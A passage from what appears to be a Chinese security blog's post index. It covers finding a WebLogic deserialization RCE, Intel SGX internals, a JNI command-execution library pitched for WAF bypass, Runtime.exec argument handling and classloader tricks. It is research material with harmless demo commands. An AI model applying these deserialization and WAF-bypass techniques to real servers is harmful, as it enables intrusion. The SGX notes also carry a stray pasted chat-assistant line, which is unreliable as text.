in)为source，以com.tangosol.util.extractor.AbstractExtractor#compare为sink开动化跑。 跑了一会，从一堆误报中看到了希望的曙光。 最后证明了这个确实可行。 CASE 3 在手工看的那段时间，虽然头皮发麻但并不是没有收获，看了几个版本的weblogic经历了“卧槽,这里怕不是有洞&quot;到&quot;卧槽,被黑名单全防住了，全防出去了啊&quot;很多次后，我隐约觉得coherence已经可以造成危害的点全部加入黑名单套餐了，不会有全新的链了（等被打脸），但二阶反序列化的点还有机会！ 这次引起我注意的是com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResult。可以看到在反序列化时它会读一个Binary进来，然后对Binary进行一个fromBinary的操作。 我注意到com.tangosol.util.ExternalizableHelper#fromByteArray中会把byte[]数组重建成BufferInput进行反序列化，因为重建所以没有黑名单过滤。 这个时候，我感觉又成了。构造好payload打过去，被weblogic防出去了。一看，是2找不到类，后面确认了一下，这个类在coherence-jcahe.jar里面，这个包并没有被weblogic加载进来。 但是就这么放弃是不可能的，我决定找到其他fromBinary的调用点，这里我选择直接打开JD-GUI搜，发现SimpleBinaryEntry这个看起来品相很好，它的getValue调用了ExternalizableHelper.fromBinary方法而其toString方法又调用了getValue。 这里还有细节需要注意m_serializer是transient的，如果用BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()是不可行的，后续反序列化会因为m_serializer为null而失败。 所以这里还是需要以readExternal为入口进来，~~因为readExternal是不受transient限制的。~~因为走这种反序列化当对象实现了SerializerAware时会自动插入serializer。 半自动化跑了一下，虽然没有绝对跑出来（没有用指针分析），但是有一个参考已经足够了： 小结 总结一下trik 在挖新的之前，可以调研历史CVE和补丁学习前人思路。 找二阶反序列化，二阶反序列化往往出现在readExternal处。二阶反序列化，既可以是标准的Byte字节流型（CVE-2016-0638），也可以是jrmp带外利用（CVE-2017-3248），还可以是一些变种比如这里的cve-2020-14756开发自实现的反序列化，甚至可以是开发在反序列化时使用了自己继承的ObjectInputStream里面但是里面重写readResolve方法（覆盖了原来的黑名单检查）。 自动化","link":"/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/"},{"title":"Intel SGX（Software Guard Extensions）速记","text":"SGX的作用 SGX使得应用程序在一段位于Enclave地址空间中能够开辟一段受保护的内存空间。这段受保护空间实行严格的访问控制和加密操作来提供对程序数据机密性和代码完整性的保护，使得即使是Hypervisor、BIOS，操作系统等特权应用都不能随意访问这段地址空间 SGX的启用 SGX support can be checked by executing the CPUID instruction with the Structured Extended Feature Leaf flag set, and checking if the second bit of the EBX register is set. To be able to use SGX, it must have been enabled by BIOS, and only a few BIOSes actually support this technology. That is one of the reasons it is not widely used. Enclave 在Intel SGX（Software Guard Extensions）中，Enclave是一个受硬件保护的安全执行环境（Trusted Execution Environment, TEE）。Enclave是一个运行环境的概念，但它也可以被视为一个程序实体的逻辑单元，因为它承载了特定的代码和数据，并在运行时提供隔离和保护。 程序在编译时会被被分为non-secure和secure part (运行在enclave中)。当调用enclave function时，程序会进入enclave环境，只有enclave中的代码可以访问enclave中数据。 一个代码的例子 INTEL SGX指令 ring0支持左边8个指令，ring3支持右边五个指令。 内存中的关键概念 PRM (Preserved Random Memory) 是DRAM中一段连续的保留内存区域 位于最低的BIOS层 不能被任何普通软件直接访问 EPC (Enclave Page Cache) 是PRM中的一部分 由操作系统负责分配 是4KB大小的内存页面组成的集合 用于存储Enclave的代码和数据 内存会被Memory Encryption Engine加密。只有在物理CPU中才会被解密。加密的密钥在boot time时被生成并存储在CPU中。 EPCM (Enclave Page Cache Map) EPCM不存储在EPC或PRM中，EPCM是一个硬件级的数据结构。存储在处理器的专用存储区域中（例如，处理器内部的寄存器或缓存中） EPCM在处理器内部，软件（ 包括Enclave代码 、操作系统）都无法直接访问。 EPCM是一个硬件维护的表，用于记录EPC中每个页面的元数据（metadata）。 它跟踪EPC页面的分配状态、所属Enclave、页面类型（如代码页、数据页、TCS页等）以及访问权限。 EPCM结构体 VALID： 标志页面是否已分配。 如果为0，表示该页面未被分配。 PT（Page Type）： 指定页面的类型，例如： PT_REG：普通数据或代码页面。 PT_SECS：SECS页面。 PT_TCS：线程控制结构（TCS）页面。 ENCLAVESECS： 标识页面所属的Enclave。 确保页面只能被其所属的Enclave访问，防止跨Enclave的非法访问。 ADDRESS： 页面对应的虚拟地址，用于访问该页面。 R/W/X（权限位）： 控制页面的访问权限： R：允许Enclave代码读取页面。 W：允许Enclave代码写入页面。 X：允许在页面中执行代码。 单个PRM中只有一个EPC区域： PRM中的一部分被划分为EPC，用于存储Enclave的页面（代码和数据）。 EPC是一个连续的内存区域，其大小由硬件和BIOS配置决定（通常是128MB，但可能更小或更大，具体取决于处理器型号和系统配置）。 换句话说，PRM中只有一个EPC区域，而不是多个EPC。 多个Enclave的页面会被分配到同一个EPC区域中，但硬件确保它们之间的隔离和安全性。(EPCM确保) 每个Enclave需要占用一定数量的EPC页面。如果EPC空间不足，系统可能会通过SGX的换页机制（paging）将部分EPC页面换出到普通内存中。 SECS (SGX Enclave Control Structure) 一个Enclave对应一个SECS SECS的作用： SECS是每个Enclave的核心元数据结构，存储了Enclave的关键信息，包括： 密码学测度（Measurement）：用于认证Enclave的完整性。 Enclave的身份信息：如Enclave的创建参数、大小、属性等。 SECS是EPC中的一个页面，但它受到严格的硬件保护， 只有SGX硬件和微码可以访问和修改 。 安全性要求： 如果Enclave中的代码能够直接修改SECS中的数据（如密码学测度或身份信息），将破坏SGX的安全模型。 为此，SGX硬件通过EPCM中的权限控制字段，确保SECS页面只能由SGX硬件访问，而不能被Enclave代码或外部软件直接修改。 TCS (Thread Control Structure) 和SECS一样，不能被其他软件包括enclave中的代码本省修改。一个enclave至少有一个，因为它为多线程而生，所以也可以有多个。 The SGX design fully supports multi-core processors. It is possible for multiple logical processors to concurrently execute the same enclave’s code at the same time, via different threads. The SGX implementation uses a Thread Control Structure (TCS) for each logical processor that executes an enclave’s code. SSA(Save State Area) 一个TCS至少有有一个SSA用于在线程因为中断或者异常退出时保存状态，在恢复时从这里面读取状态。 Stack and Heap 有自己的堆栈 Intel SGX信任根与信任链建立过程 一、硬件信任根初始化 1. Intel SGX硬件密钥体系 基础密钥(Root Provisioning Key和Root Seal Key)在制造时烧录到熔丝(Fuse)中 采用密钥派生机制(Key Derivation)生成其他功能密钥: Provisioning Key: 用于远程认证 Seal Key: 用于数据加密存储 Report Key: 用于本地报告签名 Launch Key: 用于Enclave启动控制 2. SGX硬件可信模块 测量引擎(Measurement Engine) 密钥派生引擎(Key Derivation Engine) 加密引擎(Encryption Engine) 签名验证引擎(Signature Verification Engine) 安全内存管理单元(Memory Management Unit) 二、Enclave创建与测量 1. Enclave代码准备 开发者提供Enclave代码、数据和属性定义 属性包括:XFRM、MODE(DEBUG/PRODUCTION)等 2. 硬件测量过程 逐页测量: For each page: 1MRENCLAVE = SHA256_UPDATE(MRENCLAVE || PAGE_INFO || PAGE_CONTENT) 页信息(PAGE_INFO)包含: 页类型(REG/TCS/SECS) 页属性(R/W/X权限) 加载偏移地址 最终生成256位的MRENCLAVE值 三、签名验证(SIGSTRUCT) 1. 开发者签名 使用2048位RSA密钥对生成SIGSTRUCT SIGSTRUCT包含: 12345678{ MRENCLAVE, Attributes, ISVSVN, ISVPRODID, DATE, SIGNATURE } 2. MRSIGNER生成 MRSIGNER = SHA256(RSA Public Key Modulus) 用于识别Enclave开发者身份 3. 硬件验证 验证RSA签名有效性 验证MRENCLAVE匹配 验证属性合法性 四、启动授权(EINITTOKEN) 1. Launch Enclave职责 实现Intel定义的启动控制策略 管理Enclave白名单 生成并签署EINITTOKEN 2. EINITTOKEN结构 123456789{ MRENCLAVE, MRSIGNER, Attributes, ISVSVN, CPUSVN, KEYID, MAC // 使用Launch Key计算的MAC}= 3. 授权流程 验证请求者身份(MRSIGNER) 检查启动策略合规性 使用Launch Key生成MAC 打包EINITTOKEN 五、Enclave初始化(EINIT) 1. 硬件验证 验证EINITTOKEN的MAC 验证MRENCLAVE/MRSIGNER匹配 检查属性与策略符合性 2. 初始化过程 建立Enclave上下文 初始化TCS(Thread Control Structure) 设置内存访问权限 生成Enclave加密密钥 3. 信任链确立 硬件信任根 → 测量值 → 开发者签名 → 启动授权 → 运行时隔离 这样的修改更准确地描述了SGX的信任根和信任链建立过程,包含了关键的技术细节。您觉得还有需要补充或修改的地方吗? 防止不可信的OS地址映射攻击 OS会被视作不可信环境，需要防止恶意的OS修改VA到PA的映射。 The CPU performs the usual virtual-to-physical address translation using the page tables (controlled by the untrusted OS). Once the physical address is determined, the CPU checks whether the physical address belongs to an EPC page by consulting the EPCM. If the physical address is an EPC page, the CPU compares the virtual address being accessed with the expected virtual address stored in the EPCM entry for that EPC page. If the virtual address matches, the access is allowed. If the virtual address does not match, the CPU raises an exception, and the access is denied. Enclave的调度 留给操作系统调度的指令 EPA - This instruction allocates a 4KB memory page that will contain the pages version number array (VA) to protect against replay. Each element is 64 bits long. EBLOCK - This instruction blocks all accesses to the page being prepared for eviction. All future accesses to this page will result in a page fault (“page blocked”). ETRACK - This instruction evicts a page from the EPC. The page must have been prepared properly: it must be blocked and must not be referenced by the TLB. Before writing it into the external memory, the page is encrypted, and a version number and meta-data are generated, and a final MAC is performed. ELDB/ELDU - This instruction loads into memory a previously evicted page, in a blocked state or not. It checks the MAC of the meta-data, version number (from the corresponding VA entry), and the page encrypted content. If the verification succeeds, the page content is decrypted and placed inside the chosen EPC page, and the corresponding VA entry deleted. Enclave的创建 Enclave的进入和退出 Enclave中断和恢复 Intel SGX的原生支持缺陷 SGX 的原生接口（如 ECALL 和 OCALL）非常底层，无法直接支持复杂的 OS 抽象。例如，线程管理、同步原语和动态线程创建在 SGX 中没有直接支持。 也不支持enclave之间通信。 参考 https://lingering.github.io/2020/06/18/SGX-基本原理/ https://blog.quarkslab.com/overview-of-intel-sgx-part-1-sgx-internals.html https://blog.quarkslab.com/overview-of-intel-sgx-part-2-sgx-externals.html https://www.ndss-symposium.org/wp-content/uploads/2017/09/ndss2017_07-5_Shinde_paper.pdf https://sgx101.gitbook.io/sgx101/sgx-bootstrap/enclave","link":"/2024/12/01/Intel-SGX%EF%BC%88Software-Guard-Extensions%EF%BC%89%E9%80%9F%E8%AE%B0/"},{"title":"JAVA JNI 执行命令与调试","text":"JAVA JNI 执行命令与调试 执行命令 代码基本抄自自园长的demo（为了篇幅省略了作者信息，这里统一说明一下～） JNI的好处在于底层，实战中可用绕过一些waf拦截吧。 CommandExecution.java 123public class CommandExecution { public static native String exec(String cmd);} 编译CommandExecution，并生成native层c代码需要用的头文件 12javac -cp . CommandExecution.javajavah -cp . CommandExecution CommandExecution.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &quot;CommandExecution.h&quot;using namespace std;JNIEXPORT jstringJNICALL CommandExecution_exec (JNIEnv *env, jclass jclass, jstring str) { if (str != NULL) { jboolean jsCopy; // 将jstring参数转成char指针 const char *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy); // 使用popen函数执行系统命令 FILE *fd = popen(cmd, &quot;r&quot;); if (fd != NULL) { // 返回结果字符串 string result; // 定义字符串数组 char buf[128]; // 读取popen函数的执行结果 while (fgets(buf, sizeof(buf), fd) != NULL) { // 拼接读取到的结果到result result +=buf; } // 关闭popen pclose(fd); // 返回命令执行结果给Java return env-&gt;NewStringUTF(result.c_str()); } } return NULL;} 编译，注意这里为了后续能够调试需要加 -g 参数 1g++ -fPIC -I&quot;$JAVA_HOME/include&quot; -I&quot;$JAVA_HOME/include/linux&quot; -shared -g -o libcmd.so CommandExecution.cpp MainTest.java 1234567public class MainTest { public static void main(String[] args) { System.load(&quot;/home/anonymous/Desktop/learnjni/libcmd.so&quot;); CommandExecution commandExecution = new CommandExecution(); System.out.println(commandExecution.exec(&quot;whoami&quot;)); }} 12javac MainTest.javajava MainTest 调试 调试需要同时安装JetBrain家的idea和clion，并且clion要以管理员权限（sudo）启动。 在调用native层的地方打断点 通过jps找到所运行的java类对应的类的编号 在clion选择Run-&gt;Attach to Process 然后attach到响应编号上 在下断点地方步入 步过findNative后就会跳转到clion里面然后就可以愉快的调试了～ 参考 recipeNoD002 - Debugging JNI code with IntelliJ/CLionIntellJ IDEA中JNI单步调试指南JNI安全基础","link":"/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/"},{"title":"Java Runtime.getRuntime().exec由表及里","text":"本文发在先知社区，转载到自己博客上。 问题复现 测试代码如下 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = &quot;cmd which you want to exec&quot;; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 先看看可以成功的情况 再来看看不能成功的情况 这里 &amp;&amp; 并没有达到bash中的效果 如果以前有人问我为什么会出现这种，我会毫不犹豫的回答：因为 Runtime.getRuntime().exec 执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | 这样的符号进行特殊处理。 解决方法 解决这种问题的方法有两种 第一种就是对执行命令进行编码，编码地址在这 第二种就是使用数组的形式命令执行 12String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333&quot; };InputStream in = Runtime.getRuntime().exec(command).getInputStream(); 至此从实战应用的角度这个问题已经解决了。 不过我们可以看到其实这第二种方法用到了 &amp; 上面 _Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | _` _这样的符号特殊处理。_这一结论似乎看起来并站不住脚? 下面来跟踪一下源码，看看到底发生了什么。 源码分析 当传入Runtime.getRuntime().exec的是字符串 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = &quot;echo 2333 &amp;&amp; echo 2333&quot;; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 因为传入的命令是String类型，所以进入 java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File) 。这里是第一个非常关键的点， StringTokenizer 会把传入的conmmand字符串按 \\t \\n \\r \\f 中的任意一个分割成数组cmdarray。 代码来到exec的多态实现 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) ，exec内部调用了ProcessBuilder的start。 ProcessBuilder.start内部又调用了ProcessImpl.start。 在ProcessImpl.start中有第二个非常关键的点我们可以看到程序把cmdarray第一个参数（cmdarray[0]）当成要执行的命令，把其后的部分（cmdarray[1:]）作为命令的参数转换成byte 数组 argBlock（具体规则是以\\x00进行implode）。 ProcessImpl.start最后又会把处理好的参数传入UNIXProcess UNIXProcess内部又调用了forkAndExec方法 这里的是forkAndExec是一个native方法。 从变量的命名来看，在开发者的眼中prog是要执行的命令即 echo ，argBlock都是传给 echo 的参数即2333\\x00&amp;&amp;\\x002333且传给 echo 的参数个数argc是4 可见经过StringTokenizer对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入。 12String cmd = &quot;ping &quot; + 可控点;Runtime.getRuntime().exec(cmd) 补一个完整的调用栈。 当传入Runtime.getRuntime().exec的是字符串数组 我们再来看看给Runtime传入数组的时候是什么情况。 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo 2333 &amp;&amp; echo 2333&quot; }; InputStream in = Runtime.getRuntime().exec(command).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 因为这里传入的数组，所以并没有经StringTokenizer对字符串的分割处理这一步而是直接进入了。java.lang.Runtime#exec(java.lang.String[]) 。 后面的流程和字符串的情形是一致的，最后来到forkAndExec 按照上面的说法这里 /bin/bash 是要执行的命令， -c\\x00&quot;echo 2333 &amp;&amp; echo 23333&quot; 是传给的 /bin/bash 的参数。 补一个调用栈 一个错误的想法 看到这里不知道你是不是有点晕，心底生出了疑问，在执行字符串的时候加上 /bin/bash 不就好了。像下面这样。 12345678910111213141516171819import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class linux_cmd1 { public static void main(String[] args) throws IOException { String cmd = &quot;/bin/bash -c 'echo 2333 &amp;&amp; echo 2333'&quot;; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 运行试试看，发现什么结果都没有，推测应该是shell执行命令失败了。 为什么会失败呢？我们来diff一下和数组执行最后进native的层的区别。 可以看到prog都是 /bin/bash 但是字符串模式下执行的参数变成了 -c\\x00'echo\\x002333\\x00&amp;&amp;\\x00echo\\x002333' ，对比数组模式 -c\\x00&quot;echo 2333 &amp;&amp; echo 23333&quot; 。可以发现字符串模式下因为StringTokenizer对字符串空格类字符的处理破坏了命令执行的语义。 如果再仔细看看会发现字符串模式argc为6而数组模式只有2。写到这里其实我还想钻以下牛角尖，凭什么6个参数最后就不能执行？ 进入jvm看看 带着这样的疑问，我自不量力的编译了java源码并现学了一下怎么调试jvm（调试的环境是ubuntu14.04+jdk8）下面是学习成果。 1234567891011121314151617181920import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class Test { public static void main(String[] args) throws IOException { String[] command = { &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo 2333 &amp;&amp; echo 2333&quot; }; InputStream in = Runtime.getRuntime().exec(command).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[1024]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } System.out.println(new String(baos.toByteArray())); }} 根据java native函数命名规则可以知道forkAndExec对应的c函数是 Java_java_lang_UNIXProcess_forkAndExec 。 这个函数初始化执行命令所需要一些变量（如输入输出错误流）以及提取并处理java传入进来的参数，最后调用startChild函数开启子进程。 startChild会根据是mode的数值不同进入不同的分支，mode由操作系统、libc版本决定。 我这里进入了vforkChild，vforkChild会使用vfork开启一个子进程，并且在子进程内部调用了childProcess，在clion中为了调试进入子进程需要在进入之前在gdb调试框输入 set follow-fork-mode child 和 set detach-on-fork off childProcess中调用JDK_execvpe。 JDK_execvpe最后调用系统execvp函数，我们来细一看传参情况。 故数组情况下等价于 那么我们再来考察一下，字符串的情况的情况。 故字符串模式等价于 12345int main() { const char *arg[] = {&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;'echo&quot;, &quot;2333&quot;, &quot;&amp;&amp;&quot;, &quot;echo&quot;, &quot;2333'&quot;, NULL}; execvp(arg[0],(char **) arg); return 0;} 所以整个调用链如下 123456java.lang.Runtime.exec(cmd);-&gt;java.lang.ProcessBuilder.start();--&gt;java.lang.ProcessImpl.start();---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se/src/solaris/native/java/lang/UNIXProcess_md.c----&gt;fork或VFORK或POSIX_SPAWN-----&gt;execvp(); 结论 _Runtime.getRuntime().exec执行命令的时候并没有shell上下文环境所以无法把类似于 &amp; | __这样的符号特殊处理_的本质是execvp也确实不支持shell中的特殊符号。而之所以数组情况能成是因为execvp调用了/bin/bash ，/bin/bash 解释了 &amp; , |` 这些特殊符号和execvp没关系。 参考 Java下奇怪的命令执行 在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法 Java JVM、JNI、Native Function Interface、Create New Process Native Function API Analysis How to debug a forked child process using CLion","link":"/2020/01/11/Java-Runtime-getRuntime-exec%E7%94%B1%E8%A1%A8%E5%8F%8A%E9%87%8C/"},{"title":"Java中双亲委派相关知识梳理","text":"classloader介绍 在java中每当需要加载一个类的时候，就需要用到类加载器（classloader），它存在的意义在于把class文件中字节码变成可以被java使用的class对象。java中原生自带3个classloader分别是Bootstrap ClassLoader、Ext ClassLoader、App ClassLoader另外用户也可以自定义Custom ClassLoader。那实际加载类的时候是用哪一个加载器？java为了安全着想规定了classloader之间有一套等级机制。具体来说就是：当从子加载器出发，但子加载器加载class的时候会先委派给由父加载器先加载，如果父加载器无法加载再由子加载器加载，而这套先后顺序就是平时所说的双亲委派。 BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.. 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。 ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。 AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。 容易误会的一点是Classloader之间并不是继承关系而是组合。 AppClassLoader和ExtClassLoader都继承自URLClasLoader。 URLClassLoader继承自ClassLoader。 而一般自定义加载器是直接继承ClassLoader并根据需求重写findClass或者loadClass方法（之后会提到）。 在java代码我们可以调用getParent的方法获取该加载器的父加载器。 12345678910111213public class JavaClassLoader { public static void main(String[] args) { ClassLoader appClassloader = ClassLoader.getSystemClassLoader(); ClassLoader extensionClassloader = appClassloader.getParent(); System.out.println(&quot;AppClassLoader is &quot; + appClassloader); System.out.println(&quot;The parent of AppClassLoader is &quot; + extensionClassloader); System.out.println(&quot;The parent of ExtensionClassLoader is &quot; + extensionClassloader.getParent()); }}//console ouput:////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba////The parent of ExtensionClassLoader is null ps: 因为BootstrapClassLoader是内嵌到jvm中c代码，开发者无法直接获取，因此ExtensionClassLoader.getParent()会返回null。 _ demo代码 12345678910import java.io.*;import java.lang.reflect.InvocationTargetException;public class Main { public static void main(String[] args) throws IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException { Test test = new Test(); }} 在new 的位置强制进入，可以看到是从确实是从子加载器AppClassLoader开始的。 步入两步后在第一个红框可以看到加载双亲委派的逻辑。 如果父类无法加载，那么使用自己的findClass实现来找。这里Test是我自定义的因此不在JAVA_HOME/lib/rt.jar 也不在 JAVA_HOME/lib/ext/*.jar中，所以最后会使用AppClassLoader的findClass实现，而AppClassLoader没有实现自己的findClass，所以最后是由URLClassLoader findClass寻找类。最后通过deineClass把字节码转换为类对象。 重写ClassLoader 通过上面分析我们可以看到在第一次加载类时是在loadClass进行loader调度（实现双亲委派逻辑），最后由findClass拿到路径Resource，由defineClass加载类。因此，如果我们把自己的class放在不常规的位置，就需要自定义ClassLoader，重写findClass方法。如果我们想突破双亲委派模型（覆盖系统类）就需要重写loadClass。 而实际应用中处于bypass的需要我们经常使用defineClass一个多态实现来从内存中或者文件中执行命令。看下面代码。 从内存中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import java.lang.reflect.Method;/** * Creator: yz * Date: 2019/12/17 */public class TestClassLoader extends ClassLoader { // TestHelloWorld类名 private static String testClassName = &quot;com.anbai.sec.classloader.TestHelloWorld&quot;; // TestHelloWorld类字节码 private static byte[] testClassBytes = new byte[]{ -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12 }; @Override public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { // 只处理TestHelloWorld类 if (name.equals(testClassName)) { // 调用JVM的native方法定义TestHelloWorld类 return defineClass(testClassName, testClassBytes, 0, testClassBytes.length); } return super.findClass(name); } public static void main(String[] args) { // 创建自定义的类加载器 TestClassLoader loader = new TestClassLoader(); try { // 使用自定义的类加载器加载TestHelloWorld类 Class testClass = loader.loadClass(testClassName); // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld(); Object testInstance = testClass.newInstance(); // 反射获取hello方法 Method method = testInstance.getClass().getMethod(&quot;hello&quot;); // 反射调用hello方法,等价于 String str = t.hello(); String str = (String) method.invoke(testInstance); System.out.println(str); } catch (Exception e) { e.printStackTrace(); } }} 从文件中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.InputStream;import java.util.Arrays;public class MyClassLoader extends ClassLoader{ private String classpath; public MyClassLoader(String classpath) { this.classpath = classpath; } @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { try { byte[] classDate = getClassBinaryData(name); //System.out.println(Arrays.toString(classDate)); if (classDate == null) { } else { // defineClass方法将字节码转化为类 return defineClass(name, classDate, 0, classDate.length); } } catch (IOException e) { e.printStackTrace(); } return super.findClass(name); } // 返回类的字节码 private byte[] getClassBinaryData(String className) throws IOException { InputStream in = null; ByteArrayOutputStream out = null; String path = classpath + File.separatorChar + className.replace('.', File.separatorChar) + &quot;.class&quot;; try { in = new FileInputStream(path); out = new ByteArrayOutputStream(); byte[] buffer = new byte[2048]; int len = 0; while ((len = in.read(buffer)) != -1) { out.write(buffer, 0, len); } return out.toByteArray(); } catch (FileNotFoundException e) { e.printStackTrace(); } finally { in.close(); out.close(); } return null; }} 参考 Java动态类加载，当FastJson遇到内网 Idea中那些鲜为人知的调试技巧 Java虚拟机–类加载器源码","link":"/2020/01/22/Java%E4%B8%AD%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"},{"title":"Java原生序列化与反序列化代码简要分析","text":"前言 写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答的几个问题。 为什么就java反序列化使用而言是反序列化类的readObject开始？ 为什么resolveClass方法可以防御反序列化？ 为什么在反序列化数据后面插入脏数据会不会影响反序列化？ ps: 碍于水平有限只会在代码表层做宏观和中观的分析，并不会深入特别底层。 测试代码 序列化 12345678910111213141516171819import java.io.*;class User implements Serializable { int age = 20; int money = 100; String firstname = &quot;cl0und&quot;; String lastname = &quot;lisan&quot;; User(){ System.out.println(&quot;无参数构造方法&quot;); }}public class Serial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectOutputStream oops = new ObjectOutputStream(new FileOutputStream(&quot;./serializable.txt&quot;)); oops.writeObject(new User()); }} 反序列化 123456789101112import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class Unserial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream oips = new ObjectInputStream(new FileInputStream(&quot;./serializable.txt&quot;)); User user = (User) oips.readObject(); System.out.println(user.age); }} 序列化 预处理 预处理的意义是拿到类的描述符类ObjectStreamClass，后续对类的内省和写入序列化数据都由他完成或调度。 序列化数据 可以看到一共有三步，首先是TC_OBJECT，其次是类的元信息，最后是类的具体数据。 第一步就写个标志头，比较简单我们下面直接从第二步开始看。 writeClassDesc 